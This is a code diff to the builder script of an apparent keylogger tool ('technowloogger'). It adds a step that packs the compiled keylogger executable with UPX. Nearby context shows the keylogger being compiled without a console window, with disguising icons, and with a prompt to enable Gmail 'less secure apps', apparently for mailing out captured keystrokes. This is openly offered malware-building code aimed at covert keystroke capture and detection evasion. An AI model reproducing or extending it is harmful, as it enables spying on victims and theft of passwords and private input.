@@ -212,6 +212,17 @@ def compile_for_linux(file_name, icon_path):
     else:
         subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
+def pack_exe_using_upx():
+    if os.path.exists(os.getcwd() + "\\upx\\upx.exe") and os.path.exists(os.getcwd() + f"\\dist\\{arguments.out}.exe"):
+        shutil.copy2(f"{os.getcwd()}\\upx\\upx.exe", f"{os.getcwd()}\\dist")
+        os.chdir(f"{os.getcwd()}\\dist") 
+        
+        print(f"{YELLOW}\n[*] Packing Exe Using UPX")
+        os.system(f"upx.exe {arguments.out}.exe > log.txt")
+        os.remove("log.txt")
+        os.remove("upx.exe")
+        print(f"{GREEN}[+] Packed Successfully !")
+
 def del_junk_file(file_name):
     try:
         if platform.system() == 'Windows':        
@@ -333,8 +344,11 @@ if __name__ == '__main__':
         del_junk_file(arguments.out)
         print(f"{GREEN}[+] Junk Files Removed Successfully!")
         
-        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}' or os.path.exists(f'~/opt/technowloogger/dist/{arguments.out}.exe')):
-            print(f"\n{GREEN}[+] Generated Successfully!\n")           
+        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}') or os.path.exists(f'~/opt/technowloogger/dist/{arguments.out}.exe') or os.path.exists(f'{os.getcwd()}\\dist\\{arguments.out}.exe'):
+            print(f"\n{GREEN}[+] Generated Successfully!\n")
+
+            pack_exe_using_upx()
+            
             print(f"\n\n{RED}[***] Don't forget to allow less secure applications in your Gmail account.")
             print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
             print(f"\n{RED} :O-) TIP{YELLOW} : USE ICONS from {RED}icon{YELLOW} folder like this >>  {RED}--icon icon/exe.ico")
